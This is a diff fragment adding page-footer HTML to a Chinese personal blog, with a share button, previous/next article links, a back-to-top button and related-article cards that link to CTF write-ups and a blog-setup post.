+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-share-2 flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-share-2"></use></svg>
+
+      </button>
+      <span class="reaction-label">分享</span>
+    </div>
+  </footer>
+
+  
+
+
+  <nav class="article-actions">
+    
+      <span class="article-action article-action--prev is-disabled" aria-disabled="true">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-left"></use></svg>
+
+        <span class="action-label">上一篇</span>
+        <span class="action-title">没有更早的文章了</span>
+      </span>
+    
+    
+      <a class="article-action article-action--next" href="/2026/09/15/exp_sub3_daily/">
+        <span class="action-label">下一篇</span>
+        <span class="action-title">注水：练车的一些感想</span>
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
+
+      </a>
+    
+  </nav>
 </article>
 </div>
+
+<button type="button" class="back-to-top" data-action="scroll-to-top" aria-label="返回顶部" hidden>
+  
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-up"></use></svg>
+
+</button>
+
+
+  <section class="related-paper">
+    <header class="related-paper__head">
+      <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-link"></use></svg>
+相关文章</h2>
+      <a class="related-paper__more" href="/archives/">
+        <span>查看更多</span>
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
+
+      </a>
+    </header>
+    <div class="related-paper__grid">
+      
+        <a class="related-card" href="/2026/09/10/moe2026_web/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/06.jpg" alt="moectf 2026-web write-up" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">moectf 2026-web write-up</strong>
+            <em class="related-card__date">2026-09-10</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/09/05/moe2025_web/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/06.jpg" alt="moectf 2025-web write-up" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">moectf 2025-web write-up</strong>
+            <em class="related-card__date">2026-09-05</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/08/12/%E4%BB%8E%E9%9B%B6%EF%BC%88%EF%BC%9F%EF%BC%89%E5%BC%80%E5%A7%8B%E7%9A%84blog%E6%90%AD%E5%BB%BA/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-2 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/const_img/background.jpg" alt="从零开始（？）的blog搭建" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">从零开始（？）的blog搭建</strong>
+            <em class="related-card__date">2026-08-12</em>
+          </span>
+        </a>
+      
+    </div>
+  </section>
 
 
       
